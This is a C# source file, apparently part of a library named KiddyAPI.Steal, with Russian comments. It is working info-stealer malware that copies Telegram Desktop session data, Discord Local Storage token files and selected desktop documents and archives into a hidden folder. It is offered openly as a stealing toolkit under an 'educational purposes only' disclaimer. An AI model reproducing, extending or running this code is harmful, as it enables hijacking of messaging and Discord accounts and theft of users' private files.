using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
//     | For educational purposes only, the author is not responsible.
namespace KiddyAPI.Steal
{
    public class Apps
    {
        /// <summary>
        /// Получаем файлы Телеги
        /// </summary>
        public static class Telegram
        {
            private static bool inDir = false;

            /// <summary>
            /// Получаем файлы сессии телеграмма
            /// </summary>
            /// <param name="pathToCopy">Папка, куда скопируются файлы. Желательно генерировать новое имя каждый раз</param>
            public static void Steal(string pathToCopy)
            {
                var processName = "Telegram";
                var getProcByName = Process.GetProcessesByName(processName);
                if (getProcByName.Length < 1)
                {
                    string tPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                         @"\Telegram Desktop\tdata";
                    CopyAll(tPath, pathToCopy + "\\Telegram");
                }
                else
                {
                    var dirTelegram = System.IO.Path.GetDirectoryName(getProcByName[0].MainModule.FileName);
                    var replace = dirTelegram.Replace("Telegram.exe", "") + @"\tdata";
                    CopyAll(replace, pathToCopy + "\\Telegram\\");
                }
            }

            private static void CopyAll(string fromDir, string toDir)
            {

                DirectoryInfo di = Directory.CreateDirectory(toDir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                foreach (string s1 in Directory.GetFiles(fromDir))
                    CopyFile(s1, toDir);

                foreach (string s in Directory.GetDirectories(fromDir))
                    CopyDir(s, toDir);
            }

            // Костыль
            private static void CopyFile(string name, string toDir)
            {
                try
                {
                    var fname = Path.GetFileName(name);

                    if (inDir && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                        return;
                    var s2 = toDir + "\\" + fname;

                    File.Copy(name, s2);
                }
                catch
                {
                }
            }

            //Костыль
            private static void CopyDir(string s, string toDir)
            {
                try
                {
                    inDir = true;
                    CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                    inDir = false;
                }
                catch
                {
                }
            }
        }

        /// <summary>
        /// Получаем файлы с Рабочего стола
        /// </summary>
        public static class Desktop
        {
            /// <summary>
            /// Метод для получения файлов с Десктопа
            /// </summary>
            /// <param name="dirToCopy">Куда копировать</param>
            /// <param name="rewrite">Перезапись файлов</param>
            public static void Steal(string dirToCopy, bool rewrite)
            {
                foreach (FileInfo file in new DirectoryInfo(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                {
                    if (file.Extension.Equals(".txt") || 
                        file.Extension.Equals(".docx") || file.Extension.Equals(".log") ||
                        file.Extension.Equals(".rar") || file.Extension.Equals(".zip"))
                    {
                        if (!(Directory.Exists(dirToCopy + "\\Desktop\\")))
                            Directory.CreateDirectory(dirToCopy + "\\Desktop\\");
                        file.CopyTo(dirToCopy + "\\Desktop\\" + file.Name, rewrite);
                    }
                }
            }
        }

        /// <summary>
        /// Дает доступ к сессии Дискорда
        /// </summary>
        public static class Discord
        {
            /// <summary>
            /// Забираем файлы сессии
            /// </summary>
            /// <param name="pathToCopy">Папку, куда копировать</param>
            /// <param name="rewrite">Перезапись файлов</param>
            public static void Steal(string pathToCopy, bool rewrite)
            {
                string discordPath = Environment.ExpandEnvironmentVariables("%appdata%") +
                                     @"\Discord\Local Storage\leveldb";
                if (!(Directory.Exists(pathToCopy + "\\Discord\\")))
                    Directory.CreateDirectory(pathToCopy + @"\\Discord\\");
                foreach (var files in new DirectoryInfo(discordPath).GetFiles())
                {
                    files.CopyTo(pathToCopy + "\\Discord\\" + files.Name, rewrite);
                }
            }
        }
    }
}

